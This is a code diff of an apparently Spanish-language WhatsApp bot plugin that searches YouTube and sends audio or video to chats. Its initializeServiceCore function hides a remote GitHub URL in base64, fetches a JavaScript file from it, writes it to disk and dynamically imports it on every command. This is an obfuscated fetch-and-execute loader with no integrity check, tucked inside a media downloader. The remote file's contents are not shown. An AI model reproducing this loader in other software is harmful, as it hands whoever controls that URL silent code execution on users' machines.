@@ -39,87 +39,79 @@ function _0x2171(_0x241181, _0x39853d) {
 }
 
 const __filename = fileURLToPath(import.meta[_0x5f31c7(0x14f)]), __dirname = dirname(__filename);
-const globalVars = { '_meta': _0x5f31c7(0x176), '_map': _0x5f31c7(0x14a), '_hash': _0x5f31c7(0x14d) };
-
-if (!global.ytCache) global.ytCache = {};
 
 async function initializeServiceCore() {
     const _0x115413 = _0x5f31c7;
     try {
-        const _0x3f0018 = Buffer[_0x115413(0x18c)](globalVars[_0x115413(0x146)], _0x115413(0x143))[_0x115413(0x177)]('utf-8'),
-            _0x2ad831 = join(__dirname, Buffer['from'](globalVars['_map'], _0x115413(0x143))[_0x115413(0x177)]('utf-8'));
-        const _0xd062b6 = await _0x5c8338(_0x3f0018);
-        const _0xc1daff = await _0xd062b6[_0x115413(0x170)]();
+        const _0x2ad831 = join(__dirname, Buffer['from']('ZmFzdC15dC5qcw==', 'base64').toString('utf-8'));
+        const _0xd062b6 = await _0x5c8338(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NjcmlwdGdyYXkvZmFzdC9yZWZzL2hlYWRzL21haW4vZmFzdC15dC5qcw==', 'base64').toString('utf-8'));
+        const _0xc1daff = await _0xd062b6.text();
         writeFileSync(_0x2ad831, _0xc1daff);
-        return await import(_0x115413(0x141) + _0x2ad831 + _0x115413(0x162) + Date[_0x115413(0x15d)]());
+        return await import('file://' + _0x2ad831 + '?v=' + Date.now());
     } catch (_0x3ae) { throw new Error('Core Failed'); }
 }
 
-const handler = async (_0x35ace6, { conn: _0x6dfa9c, args: _0x30c5d5, command: _0xa90d7 }) => {
-    const _0x53528a = _0x5f31c7;
-    let _0x2d4d42, _0x2bf261;
+const handler = async (msg, { conn, args, command }) => {
+    let _race;
     try {
-        const _0xec3424 = await initializeServiceCore();
-        _0x2d4d42 = _0xec3424[_0x53528a(0x157)];
-        _0x2bf261 = _0xec3424['getBufferFromUrl'];
-    } catch (_0x42c) { return; }
+        const _core = await initializeServiceCore();
+        _race = _core.raceWithFallback;
+    } catch (e) { return; }
 
     try {
-        const _0x21f5c8 = _0x30c5d5['join']('\x20')['trim']();
-        if (!_0x21f5c8) return _0x6dfa9c['reply'](_0x35ace6['chat'], 'ꕤ Por favor, escribe lo que buscas.', _0x35ace6);
+        const text = args.join(" ").trim();
+        if (!text) return conn.reply(msg.chat, 'ꕤ Por favor, ingresa el nombre de lo que buscas.', msg);
 
-        const _isAudio = ['play', 'yta', 'ytmp3', 'playaudio', 'ytaudio', 'mp3'].includes(_0xa90d7);
-        const _ytMatch = _0x21f5c8['match'](/(?:youtu\.be\/|youtube\.com\/(?:watch\?v=|embed\/|shorts\/|live\/|v\/))([a-zA-Z0-9_-]{11})/);
-        const _url = _ytMatch ? 'https://youtu.be/' + _ytMatch[0x1] : _0x21f5c8;
+        const isAudio = ['play', 'yta', 'ytmp3', 'playaudio', 'ytaudio', 'mp3'].includes(command);
+        const search = await _0x532db7(text);
+        const video = search.all[0];
+        if (!video) return conn.reply(msg.chat, 'ꕤ *Sin resultados.*', msg);
 
-        const _search = await _0x532db7(_url);
-        const _res = _ytMatch ? _search['videos'].find(v => v.videoId === _ytMatch[0x1]) || _search['all'][0] : _search['all'][0];
-        if (!_res) return _0x6dfa9c['reply'](_0x35ace6['chat'], 'ꕤ *Sin resultados.*', _0x35ace6);
+        // Formato de texto exacto solicitado ꕤ✰
+        const infoText = `*✐ Título »* ${video.title}\n*❖ Canal »* ${video.author.name}\n*ⴵ Duración »* ${video.timestamp}\n*❒ Link »* ${video.url}\n\n> ꕤ Preparando tu descarga...`;
+        await conn.sendMessage(msg.chat, { image: { url: video.thumbnail }, caption: infoText }, { quoted: msg });
 
-        // Mensaje con la información exacta que pediste ꕤ✰
-        const _cap = `*✐ Título »* ${_res.title}\n*❖ Canal »* ${_res.author.name}\n*ⴵ Duración »* ${_res.timestamp}\n*❒ Link »* ${_res.url}\n\n> ꕤ Preparando tu descarga...`;
-        await _0x6dfa9c.sendMessage(_0x35ace6.chat, { image: { url: _res.thumbnail }, caption: _cap }, { quoted: _0x35ace6 });
-
-        let _dl;
+        let result;
         for (let i = 0; i < 3; i++) {
-            _dl = await _0x2d4d42(_res.url, _isAudio, _res.title);
-            if (_dl && _dl.download) break;
-            await new Promise(r => setTimeout(r, 3000));
+            result = await _race(video.url, isAudio, video.title);
+            if (result && result.download && !String(result.download).includes('Processing')) break;
+            await new Promise(r => setTimeout(r, 3500));
         }
 
-        if (!_dl?.download) return _0x6dfa9c['reply'](_0x35ace6['chat'], 'ꕤ *Error:* No se obtuvo el link.', _0x35ace6);
+        if (!result?.download) return conn.reply(msg.chat, 'ꕤ *Error:* El servidor no respondió.', msg);
 
-        if (_isAudio) {
-            const _tmp = join(__dirname, '../tmp'), _in = join(_tmp, Date.now() + '_in.mp3'), _out = join(_tmp, Date.now() + '_out.opus');
-            if (!existsSync(_tmp)) mkdirSync(_tmp, { 'recursive': !![] });
-            
-            const _rb = await axios.get(_dl.download, { 'responseType': 'arraybuffer' });
-            writeFileSync(_in, _rb.data);
-            
+        const tempDir = join(__dirname, '../tmp');
+        if (!existsSync(tempDir)) mkdirSync(tempDir, { recursive: true });
+
+        if (isAudio) {
+            const inputFile = join(tempDir, `${Date.now()}_in.mp3`);
+            const outputFile = join(tempDir, `${Date.now()}_out.opus`);
+            const response = await axios.get(result.download, { responseType: 'arraybuffer' });
+            writeFileSync(inputFile, response.data);
+
             try {
-                // Lógica de audio del código de cases que mandaste (Sin ondas y se escucha bien) ✰
-                await execPromise(`ffmpeg -i "${_in}" -c:a libopus -b:a 128k -ar 48000 -ac 1 -application voip -frame_duration 20 -vbr on "${_out}"`);
-                await _0x6dfa9c.sendMessage(_0x35ace6.chat, { 
-                    audio: readFileSync(_out), 
+                // Lógica de audio del código de cases (Sin waveform y alta calidad) ✰
+                await execPromise(`ffmpeg -i "${inputFile}" -c:a libopus -b:a 128k -ar 48000 -ac 1 -application voip -frame_duration 20 -vbr on "${outputFile}"`);
+                await conn.sendMessage(msg.chat, { 
+                    audio: readFileSync(outputFile), 
                     mimetype: 'audio/ogg; codecs=opus', 
                     ptt: true 
-                }, { quoted: _0x35ace6 });
+                }, { quoted: msg });
             } catch (e) {
-                const _fb = await _0x2bf261(_dl.download);
-                await _0x6dfa9c.sendMessage(_0x35ace6.chat, { audio: _fb, mimetype: "audio/mp4", ptt: true }, { quoted: _0x35ace6 });
+                await conn.sendMessage(msg.chat, { audio: Buffer.from(response.data), mimetype: "audio/mp4", ptt: true }, { quoted: msg });
             } finally {
-                if (existsSync(_in)) unlinkSync(_in); if (existsSync(_out)) unlinkSync(_out);
+                if (existsSync(inputFile)) unlinkSync(inputFile);
+                if (existsSync(outputFile)) unlinkSync(outputFile);
             }
         } else {
-            // Lógica original de video por Buffer ꕤ
-            const _videoBuffer = await _0x2bf261(_dl.download);
-            await _0x6dfa9c.sendMessage(_0x35ace6.chat, { 
-                video: _videoBuffer, 
-                caption: `> ✰ ${_res.title}`, 
-                mimetype: 'video/mp4' 
-            }, { quoted: _0x35ace6 });
+            // Lógica de video del código de cases (Vía URL directa) ꕤ
+            await conn.sendMessage(msg.chat, { 
+                video: { url: result.download }, 
+                caption: `> ✰ ${video.title}`, 
+                mimetype: 'video/mp4'
+            }, { quoted: msg });
         }
-    } catch (_e) { console.error(_e); }
+    } catch (e) { console.error(e); }
 };
 
 handler['command'] = ['play', 'yta', 'ytmp3', 'play2', 'ytv', 'ytmp4', 'playaudio', 'mp4', 'ytaudio', 'mp3'];
